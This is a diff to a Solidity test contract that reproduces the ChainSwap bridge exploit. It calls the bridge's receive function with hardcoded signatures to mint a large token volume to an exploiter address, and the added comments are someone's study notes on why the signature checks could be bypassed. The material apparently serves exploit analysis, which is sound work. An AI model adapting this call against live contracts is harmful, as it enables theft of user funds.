@@ -35,20 +35,45 @@ contract ContractTest is DSTest {
     sigs[2] = Signature({signatory: 0x6EA6D36d73cF8ccD629Fbc5704eE356144A89A06, v: 28, r: 0x9ca27b8ec05746c43cd67e0099015ea9b88bdf34e8acfd6ace9dd63b8a320433, s: 0x1d4aaa253afc6c5d5f893d4a572de830538aeef3b65cb6ff3bb6fec738a899d0});
     
     proxy.call(abi.encodeWithSignature("receive(uint256,address,uint256,uint256, Signature[])", 1, exploiter, 1, 19392277118050930170440,  sigs));
+
+    /*
+    The attacker made a call to the receive function in the ChainSwap smart contract, using:
+    chainId = 1 => the receive function was receiving from ethereum.
+    to => address of the attacker to receive the funds.
+    nonce = 1 => first interaction with the chainswap SC.
+    volume => a lot of tokens for him to receive
+    sigs => signatures: He probably got them on-chain since they're passed as parameters.
+    */
+
+
     // function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable {
     // _chargeFee();
     // require(received[fromChainId][to][nonce] == 0, 'withdrawn already');
+    // me: the contract probably updates this at the end of the function call to 0, so that it won't be made again.
+    
     // uint N = signatures.length;
+    // me: 3
+    
     // require(N >= Factory(factory).getConfig(_minSignatures_), 'too few signatures');
+    //me: this is a constant, probably 3 or 2.
+
     // for(uint i=0; i<N; i++) {
     //     for(uint j=0; j<i; j++)
     //         require(signatures[i].signatory != signatures[j].signatory, 'repetitive signatory');
+    //me: makes sure all signatories are different. This is easy to be done since I may create different accs and sign a message with them
+
     //     bytes32 structHash = keccak256(abi.encode(RECEIVE_TYPEHASH, fromChainId, to, nonce, volume, signatures[i].signatory));
+
     //     bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _DOMAIN_SEPARATOR, structHash));
+
     //     address signatory = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);
     //     require(signatory != address(0), "invalid signature");
+    
     //     **require(signatory == signatures[i].signatory, "unauthorized");**
+    //me: just makes sure that different accs are really the accs signing the message
+
     //     _decreaseAuthQuota(signatures[i].signatory, volume);
+    //me: probably signatures were on-chain, so he used them to decreaseAuthQuota so that the tokens could be sent to himself.
   }
 
   receive() external payable {}
